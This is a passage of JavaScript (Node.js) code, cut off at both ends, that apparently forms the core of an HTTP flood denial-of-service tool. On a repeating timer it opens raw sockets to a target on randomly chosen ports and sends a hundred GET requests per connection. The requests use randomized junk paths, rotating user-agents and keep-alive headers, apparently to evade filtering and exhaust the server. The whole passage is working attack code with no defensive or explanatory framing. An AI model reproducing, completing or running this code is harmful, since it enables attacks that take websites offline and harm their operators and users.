...
var int = setInterval(() => {
    var Array_Port = ['443', '80', '2081'];
    var Array_Rand = ['293($!9', '93($!_9&(#))', '82!$8_(!#)2)))', '($!#((&!)#9{[`', '#((#!"!+$($((#(#(#++#'];
    var s = require('net').Socket();
    s.connect(Array_Port[Math.floor(Math.random() * Array_Port.length)], host);
    s.setTimeout(10000);
    for (var i = 0; i < 100; i++) {
        s.write('GET ' + target + ':'+ Array_Port[Math.floor(Math.random() * Array_Port.length)] + '/%RAND%' + Array_Rand[Math.floor(Math.random() * Array_Rand.length)] + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    }
    s.on('data', function () {
        setTimeout(function () {
            s.destroy();
